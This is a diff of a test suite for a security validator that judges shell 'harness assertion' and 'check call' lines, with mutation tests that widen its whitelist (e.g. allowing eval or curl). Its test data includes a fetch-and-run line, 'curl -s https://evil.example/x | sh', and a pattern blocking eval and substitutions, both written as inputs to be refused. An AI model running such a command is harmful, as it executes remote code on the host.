+    if s not in " \t" and s != W["call_comment"]:
+        ccase("check call: a separator or operator after the call", CB(tail=" " + s + " curl -s https://e.example/x"))
+L.append(("check call: no file to read the definition from (no --in)", CB(), None, None))
+for f in ("-go", "--x", "-", "-e"):
+    ccase("check call: a literal that starts with call_lit_first_char_not", CB(lit=f))
+for l in open(os.path.join(wd, "hf-call-refused.tsv")).read().split("\n"):
+    if l:
+        what, line = l.split("\t", 1); ccase("the check-call refused corpus: " + what, line)
+for v in json.load(open(os.path.join(wd, "hf-call-ctx.json"))):
+    L.append(("the check-call context variants: " + v["what"], v["line"], None, v["ctx"]))
 out = {"classes": {}, "total": len(L), "accepted": 0, "wrong_reason": 0}   # accepted: an expected refusal was ACCEPTED; wrong_reason: refused, but not for the expected reason
-for cls, line, reason in L:
+for cls, line, reason, src in L:
     d = out["classes"].setdefault(cls, {"n": 0, "accepted": [], "wrong_reason": []}); d["n"] += 1
     try:
-        J.judge(line)
+        J.judge(line, src)
     except J.Refused as e:
         if reason is not None and reason not in str(e):
             d["wrong_reason"].append(repr(line)[:160]); out["wrong_reason"] += 1
@@ -1768,9 +2075,9 @@ python3 -c "import json,sys; r=json.load(open(sys.argv[1])); print('harness enum
 while IFS= read -r cls; do
   CASE="AC16 harness enumeration: refused in every case ($cls)"
   check python3 -c "import json,sys; d=json.load(open(sys.argv[1]))['classes'][sys.argv[2]]; assert d['n'] > 0 and not d['accepted'] and not d['wrong_reason'], (d['accepted'][:5], d['wrong_reason'][:5])" "$work/hf-enum.json" "$cls"
-done < <(python3 -c "import json,sys; [print(k) for k in json.load(open(sys.argv[1]))['classes'] if not k.startswith('the refused corpus: ')]" "$work/hf-enum.json")
-CASE="AC16 harness enumeration: at least 3000 lines in at least 30 classes, none accepted and none refused for another reason"
-check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['total'] >= 3000 and len([k for k in r['classes'] if not k.startswith('the refused')]) >= 30 and r['accepted'] == 0 and r['wrong_reason'] == 0, (r['total'], r['accepted'], r['wrong_reason'])" "$work/hf-enum.json"
+done < <(python3 -c "import json,sys; [print(k) for k in json.load(open(sys.argv[1]))['classes'] if not k.startswith(('the refused corpus: ', 'the check-call refused corpus: ', 'the check-call context variants: '))]" "$work/hf-enum.json")
+CASE="AC16 harness enumeration: at least 4000 lines in at least 45 classes (both forms), none accepted and none refused for another reason"
+check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['total'] >= 4000 and len([k for k in r['classes'] if not k.startswith(('the refused', 'the check-call refused', 'the check-call context'))]) >= 45 and r['accepted'] == 0 and r['wrong_reason'] == 0, (r['total'], r['accepted'], r['wrong_reason'])" "$work/hf-enum.json"
 # --- CODE mutants: the role rules that live in the parser's code are loosened one at a time in a temp copy; the enumeration and the refused corpus must
 # then find an unexpected acceptance (or a refusal for another reason). A surviving mutant means no case pins that rule.
 hcm=$(mktemp -d "$work/hfcode.XXXXXX")
@@ -1787,12 +2094,21 @@ done <<'EOF'
 a file-test operand may be any operand (Codex R6)	args[0][1] in W["test_unary"] and args[1][2] == "pos": return	args[0][1] in W["test_unary"] and operand(args[1]): return
 cat takes at least, not exactly, its operands (Sonnet R6)	if len(rest) != len(want) or any(	if len(rest) < len(want) or any(
 a positional may name an argument that is not there	if t[2] == "pos" and int(t[1]) > len(args): raise	if t[2] == "pos" and int(t[1]) > 9: raise
+check call: any line counts as top level (comments, strings, blocks, substitutions)	if len(s.st) == 1 and not s.st[0][1] and not cont:	if True:
+check call: a file whose structure does not resolve is not refused	if s.hd or len(s.st) != 1 or s.st[0][1] or cont:	if False:
+check call: a closer with no opener is not refused	raise Refused("a closer %r with no matching opener in the file: fail closed" % w)	top[2] = False; return
+check call: the definition body may be anything	r'\(\) \{ ' + alt(W["call_callees"]) + r' "\$@"; \}'	r'\(\) \{ .* \}'
+check call: a second definition, alias or unset is not refused	raise Refused(f"{fn} is defined, aliased or unset again	return (f"{fn} is defined, aliased or unset again
+check call: a file sourced after the definition is not refused	raise Refused(f"a file is sourced after the definition	return (f"a file is sourced after the definition
+check call: a call before the definition is not refused	raise Refused(f"the line calls {fn} before its definition	return (f"the line calls {fn} before its definition
+check call: a reassignment of the variable is not refused	raise Refused(f"${var} is assigned again	return (f"${var} is assigned again
+check call: no file is needed	raise Refused("a check call needs its own file	return ("a check call needs its own file
 EOF
 # --- the GOLDEN whitelist (Sonnet, PR 289 round 5: the mutation run catches only the widenings it lists; a security control fails closed). The sha256 of
 # HARNESS_WHITELIST as canonical JSON (sorted keys, no spaces, ASCII) must equal HARNESS_WHITELIST_GOLDEN below: ANY change to the grammar, a widening
 # the mutation list does not name included, turns this suite red. Changing the grammar is therefore two deliberate edits in one reviewed diff: the
 # whitelist, and this golden value (whose new value the failing case prints).
-HARNESS_WHITELIST_GOLDEN=b2584723ffad2283b2d195aff694c38669d7746ef2e1dfe2520207768060371d
+HARNESS_WHITELIST_GOLDEN=981f167237e7db151d711a307925364a6b04b51499111216c04e6ef2efd58624
 cat >"$work/hf_gold.py" <<'PY'
 import hashlib, importlib.util, json, sys
 spec = importlib.util.spec_from_file_location("hf", sys.argv[1]); m = importlib.util.module_from_spec(spec)
@@ -1819,6 +2135,8 @@ grep_options + -P (Sonnet R4)	HARNESS_WHITELIST["grep_options"].append("-P")
 ; in rule_title_chars (Sonnet R4)	HARNESS_WHITELIST["rule_title_chars"] += ";"
 grep_options + -vq	HARNESS_WHITELIST["grep_options"].append("-vq")
 a new key	HARNESS_WHITELIST["extra"] = []
+call_title_chars + ; (the check-call form)	HARNESS_WHITELIST["call_title_chars"] += ";"
+call_assign_roots + work (the check-call form)	HARNESS_WHITELIST["call_assign_roots"].append("work")
 a reordered list (order is part of the reviewed text)	HARNESS_WHITELIST["commands"].reverse()
 EOF
 python3 - "$work/harness_form.py" "$hgd/m.py" "pass" <<'PY'
@@ -1870,6 +2188,34 @@ end_of_options not required	HARNESS_WHITELIST["end_of_options"] = ""
 pattern may start with -	HARNESS_WHITELIST["pattern_first_char_not"] = ""
 grep_options + --file=pats	HARNESS_WHITELIST["grep_options"].append("--file=pats")
 dquote_escapes + \-	HARNESS_WHITELIST["dquote_escapes"].append("\\-")
+call_title_chars + $	HARNESS_WHITELIST["call_title_chars"] += "$"
+call_title_chars + backtick	HARNESS_WHITELIST["call_title_chars"] += "`"
+call_title_chars + quote	HARNESS_WHITELIST["call_title_chars"] += '"'
+call_title_chars + backslash	HARNESS_WHITELIST["call_title_chars"] += "\\"
+call_title_chars + ;	HARNESS_WHITELIST["call_title_chars"] += ";"
+call_title_chars + >	HARNESS_WHITELIST["call_title_chars"] += ">"
+call_fn_chars + K	HARNESS_WHITELIST["call_fn_chars"] += "K"
+call_fn_chars + _	HARNESS_WHITELIST["call_fn_chars"] += "_"
+call_fn_chars + 2	HARNESS_WHITELIST["call_fn_chars"] += "2"
+call_callees + eval	HARNESS_WHITELIST["call_callees"].append("eval")
+call_callees + curl	HARNESS_WHITELIST["call_callees"].append("curl")
+call_lit_chars + $	HARNESS_WHITELIST["call_lit_chars"] += "$"
+call_lit_chars + *	HARNESS_WHITELIST["call_lit_chars"] += "*"
+call_lit_chars + slash	HARNESS_WHITELIST["call_lit_chars"] += "/"
+call_lit_chars + space	HARNESS_WHITELIST["call_lit_chars"] += " "
+call_lit_chars + ~	HARNESS_WHITELIST["call_lit_chars"] += "~"
+call_lit_first_char_not removed	HARNESS_WHITELIST["call_lit_first_char_not"] = ""
+call_var_chars + x	HARNESS_WHITELIST["call_var_chars"] += "x"
+call_var_chars + _	HARNESS_WHITELIST["call_var_chars"] += "_"
+call_var_chars + 1	HARNESS_WHITELIST["call_var_chars"] += "1"
+call_assign_roots + work	HARNESS_WHITELIST["call_assign_roots"].append("work")
+call_assign_roots + HOME	HARNESS_WHITELIST["call_assign_roots"].append("HOME")
+call_assign_roots + CALLS	HARNESS_WHITELIST["call_assign_roots"].append("CALLS")
+call_path_chars + *	HARNESS_WHITELIST["call_path_chars"] += "*"
+call_path_chars + space	HARNESS_WHITELIST["call_path_chars"] += " "
+call_path_chars + A	HARNESS_WHITELIST["call_path_chars"] += "A"
+call_comment empty (any trailing text)	HARNESS_WHITELIST["call_comment"] = ""
+call_comment ; (a second command)	HARNESS_WHITELIST["call_comment"] = ";"
 EOF
 hfm=$(mktemp -d "$work/hfmut.XXXXXX")
 while IFS=$'\t' read -r what patch; do
@@ -1897,9 +2243,9 @@ open(sys.argv[2], "w").write(s.replace(m, m + sys.argv[3] + "\n"))
 PY
 python3 "$work/hf_enum.py" "$hfm/m.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$hfm/e.json" </dev/null
 check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['accepted'] == 0 and r['wrong_reason'] == 0, r" "$hfm/e.json"
-CASE="every committed row's line is harmless in any shell context: the test holds each line's text, its hashes match the row, and read as shell it is a comment, a syntax error (Python source), or only echo/printf/tee/cat/exit/fi with no substitution, or a harness assertion line that harness_form.py accepts"
-check python3 - "$root/.github/supply-chain-exceptions.json" "$work/harness_form.py" <<'PY'
-import hashlib, json, re, shlex, subprocess, sys
+CASE="every committed row's line is harmless in any shell context: the test holds each line's text, its hashes match the row, and read as shell it is a comment, a syntax error (Python source), or only echo/printf/tee/cat/exit/fi with no substitution, or a harness assertion or check-call line that harness_form.py accepts (a check call judged in its own file)"
+check python3 - "$root/.github/supply-chain-exceptions.json" "$work/harness_form.py" "$root" "$work/p4-ctx.sh" <<'PY'
+import hashlib, json, os, re, shlex, subprocess, sys
 H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:16]
 LINES = {   # key -> the flattened line of pull request 271 (be20423) the row is written for
     "bdc2f348c4dbc92f": "same-step) printf ' - runs: |\\n curl -s https://evil.example/x | sh\\n' | tee -a \"$work/gr/a.yaml\" >>\"$work/gr/b.yaml\";;",
@@ -1916,6 +2262,10 @@ LINES = {   # key -> the flattened line of pull request 271 (be20423) the row is
     "2d6db92689368ed6": "# url characters, curl flags and caps",
     "bd58928b6ad7d1e1": "# the live melange resolution moves busybox to 9.9.9-r0: a copy of the live melange lock with that version, and the new apk in the live archive/curl dir",
     "e40f62c4290cc6dc": "# ---- P3 review round 2 (Sonnet extras): pointer, certified.txt shape, index tied to the locks, datahash, ranges, curl flags, openssl -----------------------------",
+    # the flattened lines of the apk build driver tests (bin/build-apk-test.sh, P4) the P4 rows are written for: one harness assertion, two check calls
+    "619c2a8b2dd62bf2": "t \"rule 15\" \"the inputs manifest holds the melange lock and the environment read back from the apk\" bash -c 'grep -q -- \"busybox=1.37.0-r5\" \"$1\" && grep -q -- \"wget=1.25.0-r0\" \"$1\"' _ \"$work/o1-inputs-manifest.json\"",
+    "1922daeb31dfbe22": "t \"rule 12\" \"melange.yaml: Go from go.dev, one sha256-pinned fetch per arch, no Wolfi go apk, wget present, go.mod go <= archived Go\" ck \"mel-go\" \"$M\" # fetch.yaml:4-6 (needs wget), :78-80 (a checksum is required), :85-90 (cache lookup), :108-111 (verification)",
+    "90ba0b0ce857e5d7": "t \"rule 15\" \"melange.yaml build packages pinned name=version incl. git, busybox, ca-certificates-bundle, wget\" ck \"mel-pinned\" \"$M\"",
 }
 SAFE = {"echo", "printf", "tee", "cat", "exit", "fi"}
 rows = json.load(open(sys.argv[1]))["unmeasured_text"]
@@ -1924,9 +2274,12 @@ for r in rows:
     line = LINES[r["key"]]
     segs = re.split(r"\s*(?:;|&&|\|\||\|)\s*", line)
     assert H(line) == r["line"] and r["key"] in {H(s) for s in segs}, r
-    if line.startswith("t "):                                            # the harness assertion form: harness_form.py decides, nothing else applies
-        hr = subprocess.run([sys.executable, sys.argv[2], line], capture_output=True, text=True, stdin=subprocess.DEVNULL)
-        assert hr.returncode == 0 and hr.stdout.startswith("harness assertion"), ("not a harness assertion line", hr.stdout, r)
+    if line.startswith("t "):                                            # the harness assertion and check-call forms: harness_form.py decides, nothing else applies
+        src = os.path.join(sys.argv[3], r["file"])                       # a check call is judged in its own file: this tree's copy, or the copied context before it lands
+        src = src if os.path.isfile(src) else {"bin/build-apk-test.sh": sys.argv[4]}.get(r["file"])
+        hr = subprocess.run([sys.executable, sys.argv[2]] + (["--in", src] if src else []) + [line], capture_output=True, text=True, stdin=subprocess.DEVNULL)
+        assert hr.returncode == 0 and hr.stdout.startswith(("harness assertion", "harness check call")), ("not a harness assertion or check-call line", hr.stdout, r)
+        assert r["ruling"].startswith("harness check call: " if hr.stdout.startswith("harness check call") else "harness assertion: "), ("the ruling names another form", r)
         continue
     assert not re.search(r"\$\(|`|<\(|>\(|\beval\b|\bsource\b", line), ("a substitution or eval can run anything", r)
     if line.startswith("#"):
@@ -1981,7 +2334,7 @@ for r in rows:
     assert set(r) - {"count"} == {"file", "form", "key", "line", "ruling"} and (type(r.get("count", 1)) is int and 1 <= r.get("count", 1) <= 100), r
     assert re.fullmatch(r"[0-9a-f]{16}", r["line"]), r
     assert r["file"] and not r["file"].startswith((".github/agent/", "/")) and r["form"] in forms, r
-    pre = next((x for x in ("text, not a command: ", "harness assertion: ") if r["ruling"].startswith(x)), None)
+    pre = next((x for x in ("text, not a command: ", "harness assertion: ", "harness check call: ") if r["ruling"].startswith(x)), None)
     assert re.fullmatch(r"[0-9a-f]{16}", r["key"]) and pre and len(r["ruling"]) > len(pre) + 10, r
 PY
 
